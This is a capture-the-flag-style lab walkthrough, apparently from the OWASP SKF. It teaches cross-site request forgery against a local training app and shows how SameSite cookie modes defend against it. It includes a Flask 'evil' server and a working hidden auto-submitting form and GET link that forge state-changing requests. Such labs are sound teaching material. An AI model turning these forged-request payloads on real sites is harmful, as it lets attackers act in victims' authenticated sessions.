## Reconnaissance

CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim's behalf. For most sites, browser requests automatically include any credentials associated with the site, such as the user's session cookie, IP address, Windows domain credentials, and so forth. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim.

CSRF attacks target functionality that causes a state change / data mutation on the server, such as changing the victim's email address or password, or purchasing something. Forcing the victim to retrieve data doesn't benefit an attacker because the attacker doesn't receive the response, the victim does. As such, CSRF attacks target state-changing requests.

It's sometimes possible to store the CSRF attack on the vulnerable site itself. Such vulnerabilities are called "stored CSRF flaws". This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack. If the attack can store a CSRF attack in the site, the severity of the attack is amplified. In particular, the likelihood is increased because the victim is more likely to view the page containing the attack than some random page on the Internet. The likelihood is also increased because the victim is sure to be authenticated to the site already.

Lets start the application and login with the default credentials.

{% hint style="info" %}
username : admin  
password: admin
{% endhint %}

When we are loggedin to the application we can see that we can set our favorite color and this will be stored in the session of the user.

If we inspect the request with an intercepting proxy we can see that the application is performing a POST request that results in a data mutation, storing our favorite color into the session of the user and displaying this back to the user in the HTML website.

![](.gitbook/assets/screen-shot-2019-03-04-at-21.01.51.png)

Also we can see that the application is not using any form of protection for preventing CSRF because there is no unique token being send in the POST request.

## Exploitation

In order to to exploit this vulnerability we need to set up our evil webserver to do the malicious CSRF using a POST request from. We could achieve this by creating the following python flask application.

```python
from flask import Flask, request, url_for, render_template, redirect, make_response
import requests


app = Flask(__name__, static_url_path='/static', static_folder='static')

app.config['DEBUG'] = True

@app.route("/")
def start():
    return render_template("evil.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)
```

Save the snippet above to &gt; app.py and run the commands below to install some dependencies.

```text
$ pip install flask
$ pip install requests
$ python app.py
```

Of course you can also run your app on whatever service you want it does not have to be python flask.

Now that the service is running we want to serve the malicious piece of javascript that is responsible for performing the malicious CSRF POST request.

```markup
<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='http://localhost:5000/update' target="csrf-frame" id="csrf-form">
  <input type='hidden' name='color' value='Hackzord!'>
  <input type='submit' value='submit'>
</form>
<script>document.getElementById("csrf-form").submit()</script>
```

Save the snippet above to &gt; templates/evil.html and run the command below to start our evil application.

```text
$ python app.py
```

Now when we have in the browser tab our active session of the application we can open a new tab where we will load our evil page we just created.

```text
http://localhost:1337/
```

This will now create a POST request to the application and changing the value of blue to the new value of 'Hackzord!' As you can see the Referer is set to our evil website where the request originated from.

Also when we refresh the original page of the application we can see that the new vaulue has been replaced with the content of our evil app.

## SameSite Attribute

The modern browsers have introduced a defense in depth mechanism against CSRF type of attacks, the *SameSite* cookie attrbute. 

```text
Set-Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZSwidXNlcklkIjoxfQ.EF0EsA.9BZ_v9-AKp7lPsL1NV9xOECWMog; 
HttpOnly; Path=/; SameSite=Strict
```

This atrribute allows the user-agents to identify whether a cookie should be set along with cross-site-requests or not.


This cookie attribute can be set with the following values:

Value | Result
------------ | -------------
Strict|Cookie will be only sent with same-site requests.
Lax|Cookie will be sent with same-site requests and, also, with cross-site-requests generated after top-level navigation (by clikcking on a link) that are not CSRF-prone (POST).  
None|Cookies will always be sent with cross-site-requests.

To make this concept more clear let's exercise it within this SKF Lab.

In the home page, let's use the Secure Login form for authentication. 

![](.gitbook/assets/csrf-samesite3.png)

You can note in Burp's response tab the cookie was set with *SameSite=Strict*.

```text
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3638
Vary: Cookie
Set-Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZSwidXNlcklkIjoxfQ.EF0NoQ.Ojy7JzSr_UbjRBo_NMMGR_yxowk; 
HttpOnly; Path=/; SameSite=Strict
Server: Werkzeug/0.14.1 Python/3.7.4+
Date: Fri, 13 Sep 2019 11:23:13 GMT
```
Set your preferred color.

Now, in a different browser tab, try to run again the CSRF attack.

![](.gitbook/assets/csrf-samesite4.png)

Coming back to the first tab and check if the color was changed by the CSRF attack or not by clicking on *refresh the page*.

![](.gitbook/assets/csrf-samesite5.png)

Nothing has changed!

Looking at request logged in Burp we can understand the reason.

![](.gitbook/assets/csrf-samesite6.png)

As the cookie was set in Strict mode, the browser was instructed to not send it with any cross-site-request. Thus, as Color Change requires an authenticated session, this request is treated as anonymous and therefore,rejected by the application. 

Let's see how *Lax* mode works, by using the *Login Still Insecure* authentication form.

![](.gitbook/assets/csrf-samesite7.png)

You can note in Burp's response tab the cookie was set with *SameSite=Lax*.

```text
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3633
Vary: Cookie
Set-Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZSwidXNlcklkIjoxfQ.EF0TJw.-LXFBh6ivInUzalSWltptuU4Kxk; 
HttpOnly; Path=/; SameSite=Lax
Server: Werkzeug/0.14.1 Python/3.7.4+
Date: Fri, 13 Sep 2019 11:46:47 GMT
```

Set your preferred color and once again run the CSRF attack in a different tab.

Coming back to the first tab and check if the color was changed by the CSRF attack or not by clicking on *refresh the page*.

![](.gitbook/assets/csrf-samesite5.png)

Nothing has changed again! *Lax* mode also blocked the cookie to be sent over POST cross-site-request. 

![](.gitbook/assets/csrf-samesite6.png)

This lab was specially designed to also accept GET query string parameters for color changing.

Now adapt the CSRF Evil Server page to send a GET request as link and click on it.

```html
<a href="http://localhost:5000/update?color=Hackzord%21">Try with GET method</a>
```
![](.gitbook/assets/csrf-samesite8.png)

The request will be executed containing the required cookies, therefore, the CSRF attack is successful.

![](.gitbook/assets/csrf-samesite10.png)

![](.gitbook/assets/csrf-samesite9.png)

*Lax* mode allowed the browser to send the cookie through the cross-site-request after top-level navigation using a non-CSFR method (GET). In other words, if the application accepts GET query string parameters to change data in persistence(or allows POST requests being converted into GET), CSRF attack will also succeed in this mode.
